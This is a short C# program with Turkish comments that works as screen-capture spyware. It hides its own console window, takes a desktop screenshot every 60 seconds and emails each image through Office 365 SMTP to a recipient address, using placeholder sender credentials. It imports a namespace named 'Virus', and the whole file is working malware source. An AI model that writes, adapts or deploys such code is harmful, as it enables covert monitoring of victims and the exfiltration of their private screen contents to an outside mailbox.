using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using System.Net.Mime;
using System.Net;
using System.Threading.Tasks;
using Virus;
using System.Runtime.CompilerServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    static Timer timer;
    static int screenshotCounter = 1;

    static void Main()
    {
        var handle = GetConsoleWindow();

        Console.WriteLine("Ekran Görüntüsü Alıyor");
        ShowWindow(handle, SW_HIDE);

        // Timer'ı başlat
        timer = new Timer(DoWork, null, TimeSpan.Zero, TimeSpan.FromSeconds(60));

        Console.WriteLine("Uygulama devam ediyor...");


        Console.ReadKey();
    }
    static void ShowPopup(string message)
    {
        Console.Clear();
        Console.WriteLine(new string('-', Console.WindowWidth));
        Console.WriteLine($"|{new string(' ', (Console.WindowWidth - message.Length - 2) / 2)}{message}{new string(' ', (Console.WindowWidth - message.Length - 1) / 2)}|");
        Console.WriteLine(new string('-', Console.WindowWidth));
    }
    static async void DoWork(object state)
    {
        DesktopScreenShot a = new DesktopScreenShot();

        string fileName = $"screenshot{DateTime.Now:yyyyMMdd_HHmmss}_{screenshotCounter}.png";
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string fullPath = System.IO.Path.Combine(desktopPath, fileName);

        a.CaptureDesktop(fullPath);
        Console.WriteLine("Masaüstü ekran görüntüsü başarıyla kaydedildi: " + fullPath);
        ShowPopup("Ekran Görüntüsü Alındı");

        try
        {
            await SendEmail("<Alıcının Maili>", "Ekran Görüntüsü", "Ekran görüntüsü ektedir.", fullPath);
            ShowPopup("Ekran Görüntüsü Yollandı");
        }
        catch (Exception ex)
        {
            ShowPopup("E-posta gönderme hatası: " + ex.Message);
        }
    }

    static async Task SendEmail(string to, string subject, string body, string attachmentPath)
    {
        using (SmtpClient client = new SmtpClient("smtp.office365.com"))
        {
            // E-posta gönderen bilgileri
            client.Credentials = new NetworkCredential("example@outlook.com", "password");
            client.Port = 587; // Outlook SMTP portu
            client.EnableSsl = true;

            using (MailMessage message = new MailMessage("example@outlook.com", to, subject, body))
            {
                // Ek dosya ekleniyor
                Attachment attachment = new Attachment(attachmentPath, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = attachment.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(attachmentPath);
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(attachmentPath);
                disposition.ReadDate = System.IO.File.GetLastAccessTime(attachmentPath);
                message.Attachments.Add(attachment);

                // E-posta gönderme işlemi
                await client.SendMailAsync(message);
            }
        }


  
    }
}